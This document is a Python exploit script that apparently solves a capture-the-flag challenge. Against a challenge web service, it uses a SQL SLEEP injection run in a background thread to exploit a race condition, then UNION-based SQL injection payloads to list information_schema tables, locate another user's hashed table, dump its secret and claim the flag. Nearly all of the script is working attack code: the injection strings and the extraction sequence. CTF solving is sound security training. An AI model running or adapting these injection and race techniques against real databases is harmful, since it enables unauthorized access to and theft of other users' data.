import requests
import threading
import time
import hashlib


#proxies = {'http': 'http://127.0.0.1:8080'}
URL = "http://challs.nusgreyhats.org:33333"

def get_hash(user_id):
    hasher = hashlib.sha1()
    hasher.update(b'fearless_concurrency')
    hasher.update(user_id.to_bytes((user_id.bit_length() + 7) // 8, byteorder='little'))
    table_prefix = f"tbl_{hasher.hexdigest()}"
    return table_prefix
    
def register():
    url = "http://challs.nusgreyhats.org:33333/register"
    r = requests.post(url)
    return int(r.text)

def sleeper(user_id):
    try:
        json = {"query_string": "' UNION SELECT SLEEP(15)-- -", "user_id": user_id}
        r = requests.post(f"{URL}/query", json=json)
        print("[*] slept")
    except requests.exceptions.Timeout:
        print("request timeout occurred.") 

def get_table(user_id, dummy_user_id):
    json = {"query_string": f"' UNION SELECT (SELECT table_name FROM information_schema.tables WHERE table_name LIKE '{get_hash(user_id)}%')-- -", 
            "user_id": dummy_user_id}
    r = requests.post(f"{URL}/query", json=json)
    print(f"[*] retrieved table name: {r.text}")
    return r.text

def get_secret(dummy_user_id, table_name):
    json = {"query_string": f"' UNION SELECT (SELECT * FROM {table_name})-- -", "user_id": dummy_user_id}
    r = requests.post(f"{URL}/query", json=json)
    print(f"[*] retrieved secret: {r.text}")
    return int(r.text)

def get_flag(user_id, secret):
    json = {"secret": secret, "user_id": user_id}
    r = requests.post(f"{URL}/flag",  json=json)
    print(f"[*] retrieved flag: {r.text}")
    return r.text

def main():
    dummy_user_id = register()
    print(f"[*] registered user 1")
    user_id = register()
    print(f"[*] registered user 2")

    print(f"[*] injecting sleep")   
    sleeper_thread = threading.Thread(target=sleeper, args=(user_id,))
    sleeper_thread.start()


    print(f"[*] extracting table, secret and flag")
    table_name = get_table(user_id, dummy_user_id)
    secret = get_secret(dummy_user_id, table_name)
    flag = get_flag(user_id, secret)
    

    sleeper_thread.join()

if __name__ == "__main__":
    main()
